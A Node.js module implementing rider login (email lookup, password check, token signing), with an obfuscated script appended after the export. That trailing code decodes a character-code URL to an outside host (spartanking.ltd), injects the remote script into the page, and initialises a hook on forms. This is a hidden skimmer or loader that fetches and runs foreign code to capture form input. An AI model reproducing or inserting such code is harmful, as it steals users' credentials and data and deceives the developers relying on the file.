const { Rider } = require('../../infra/database/models');
const ErrorHandler = require('../../infra/utils/errorHandler');
const Encryption = require('../../infra/utils/encryption');
const {
  RESPONSE_MESSAGES,
  ERROR_TYPES,
  HTTP_STATUS_CODES,
} = require('../../../constants');

/**
 * Function for rider/user login.
 * @param {*} email
 * @param {*} password
 */

async function login({ email, password }) {
  //Check if this email already exist
  const rider = await Rider.findOne({ email });
  if (!rider) {
    return ErrorHandler.throwError({
      message: RESPONSE_MESSAGES.MESSAGES.RIDER_NOT_FOUND,
      code: HTTP_STATUS_CODES.CODES.DATA_NOT_FOUND,
      type: ERROR_TYPES.TYPES.DATA_NOT_FOUND,
    });
  }
  // Compare Password
  const isCorrect = rider.comparePassword(password);
  if (!isCorrect) {
    return ErrorHandler.throwError({
      message: RESPONSE_MESSAGES.MESSAGES.WRONG_PASSWORD,
      code: HTTP_STATUS_CODES.CODES.UNAUTHORIZED,
      type: ERROR_TYPES.TYPES.UNAUTHORIZED,
    });
  }
  // Sign Token
  let token = await Encryption.signToken(rider.safeObject());
  return { token, rider: rider.safeObject() };
}

module.exports = login;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b